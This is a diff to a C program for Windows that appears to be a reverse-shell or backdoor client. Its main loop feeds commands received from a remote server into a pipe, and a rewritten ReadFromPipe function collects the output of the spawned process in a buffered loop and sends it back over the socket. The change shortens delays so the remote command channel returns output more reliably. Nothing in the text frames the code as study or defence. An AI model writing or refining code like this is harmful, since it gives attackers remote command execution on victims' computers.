@@ -63,7 +63,7 @@ int main() {
 
        
         WriteToPipe(recvserver);
-        Sleep(5000);
+        Sleep(300);
         ReadFromPipe(sock);
     }
     
@@ -107,17 +107,41 @@ void WriteToPipe(const char *recvserver) {
 
 void ReadFromPipe(SOCKET sock) {
     DWORD dwRead;
-    CHAR chBuf[7000];
+    char chBuf[20000]; 
+    char tempbuf[4096]; 
     DWORD bytesAvailable;
-    int bytecounter;
-    bytecounter = 0;
+    int totalBytes = 0;
 
-        memset(chBuf,0,sizeof(chBuf));
+    memset(chBuf, 0, sizeof(chBuf));
+   
+    
+
+    while (1) {
         PeekNamedPipe(hRead_out, NULL, 0, NULL, &bytesAvailable, NULL);
-        BOOL success = ReadFile(hRead_out, chBuf, sizeof(chBuf) - 1, &dwRead, NULL);
-        if (!success || dwRead == 0)  
+        if (bytesAvailable == 0) {
+            break; 
+        }
 
-        chBuf[dwRead] = '\0'; 
-        send(sock,chBuf,strlen(chBuf),0);
-        Sleep(200);
+        memset(tempbuf, 0, sizeof(tempbuf)); 
+
+        ReadFile(hRead_out, tempbuf, sizeof(tempbuf) - 1, &dwRead, NULL);
+        if (dwRead == 0) break;
+
+        tempbuf[dwRead] = '\0';
+
+        if (totalBytes + dwRead < sizeof(chBuf) - 1) {
+            strcat(chBuf, tempbuf);
+            totalBytes += dwRead;
+        } else {
+            break;
+        }
+        
+        Sleep(100);
+    }
+
+    if (totalBytes > 0) {
+        send(sock, chBuf, totalBytes, 0);
+    }
+
+    Sleep(200);
 }
